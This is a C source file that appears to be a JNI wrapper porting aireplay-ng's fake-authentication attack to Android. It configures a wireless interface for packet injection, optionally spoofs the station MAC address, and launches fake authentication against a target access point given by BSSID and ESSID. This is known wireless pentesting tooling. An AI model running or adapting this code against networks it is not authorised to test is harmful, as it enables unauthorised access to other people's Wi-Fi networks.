int attack_fakeauth(JNIEnv* pEnv, jobject pThis, jmethodID pMid, char* interface_name, int reassoc_timing, char* essid, char* bssid, int use_custom_station_mac, char* station_mac, int keepalive_timing, int packet_timing, int id)
{


    cb_jnienv = pEnv;
    cb_obj = (*pEnv)->NewGlobalRef(pEnv, pThis);
    cb_mid = pMid;
    cb_id = id;
    stop_att = 0;
    int n, i, ret;

    /* check the arguments */

    memset( &opt, 0, sizeof( opt ) );
    memset( &dev, 0, sizeof( dev ) );

    opt.f_type    = -1; opt.f_subtype   = -1;
    opt.f_minlen  = -1; opt.f_maxlen    = -1;
    opt.f_tods    = -1; opt.f_fromds    = -1;
    opt.f_iswep   = -1; opt.ringbuffer  =  8;

    opt.a_mode    = -1; opt.r_fctrl     = -1;
    opt.ghost     =  0;
    opt.delay     = 15; opt.bittest     =  0;
    opt.fast      =  0; opt.r_smac_set  =  0;
    opt.npackets  =  1; opt.nodetect    =  0;
    opt.rtc       =  1; opt.f_retry	=  0;
    opt.reassoc   =  0;

    start_logger("FAKEAUTH LOGGER");

/* XXX */
#if 0
#if defined(__FreeBSD__)
    /*
        check what is our FreeBSD version. injection works
        only on 7-CURRENT so abort if it's a lower version.
    */
    if( __FreeBSD_version < 700000 )
    {
        fprintf( stderr, "Aireplay-ng does not work on this "
            "release of FreeBSD.\n" );
        exit( 1 );
    }
#endif
#endif


    opt.npackets = packet_timing;
    opt.delay = keepalive_timing;
    getmac( bssid, 1, opt.r_bssid );
    
    //if(getmac( card_mac, 1, opt.r_smac ) == 0)
    //    opt.r_smac_set=1;
    
    memset(  opt.r_essid, 0, sizeof( opt.r_essid ) );
    strncpy( opt.r_essid, essid, sizeof( opt.r_essid )  - 1 );

    opt.a_delay = reassoc_timing;
    opt.a_mode = 1;

    dev.fd_rtc = -1;

    opt.iface_out = interface_name;
    opt.port_out = get_ip_port(opt.iface_out, opt.ip_out, sizeof(opt.ip_out)-1);

  
        /* open the replay interface */
        _wi_out = wi_open(opt.iface_out);
        if (!_wi_out)
            return 1;
        dev.fd_out = wi_fd(_wi_out);

        /* open the packet source */
        if( opt.s_face != NULL )
        {
            _wi_in = wi_open(opt.s_face);
            if (!_wi_in)
                return 1;
            dev.fd_in = wi_fd(_wi_in);
            wi_get_mac(_wi_in, dev.mac_in);
        }
        else
        {
            _wi_in = _wi_out;
            dev.fd_in = dev.fd_out;

            /* XXX */
            dev.arptype_in = dev.arptype_out;
            wi_get_mac(_wi_in, dev.mac_in);
        }

        wi_get_mac(_wi_out, dev.mac_out);
    

    /* drop privileges */
    if (setuid( getuid() ) == -1) {
		perror("setuid");
	}

    /* XXX */
    if( opt.r_nbpps == 0 )
    {
        if( dev.is_wlanng || dev.is_hostap )
            opt.r_nbpps = 200;
        else
            opt.r_nbpps = 500;
    }

    if(use_custom_station_mac) {
        if( getmac( station_mac, 1, opt.r_smac ) != 0 )
            {
                printf( "Invalid source MAC address.\n" );
                return( 1 );
            }
            opt.r_smac_set=1;
    }
    //if there is no -h given, use default hardware mac
    if( maccmp( opt.r_smac, NULL_MAC) == 0 )
    {
        memcpy( opt.r_smac, dev.mac_out, 6);
        if(opt.a_mode != 0 && opt.a_mode != 4 && opt.a_mode != 9)
        {
            printf("Using the device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\n",
                    dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);
        }
    }


    //using the device MAC
    //memcpy( opt.r_smac, dev.mac_out, 6);
        
           

    do_attack_fake_auth();

    /* that's all, folks */
     (*pEnv)->DeleteGlobalRef(pEnv, cb_obj);

    return( 0 );
}
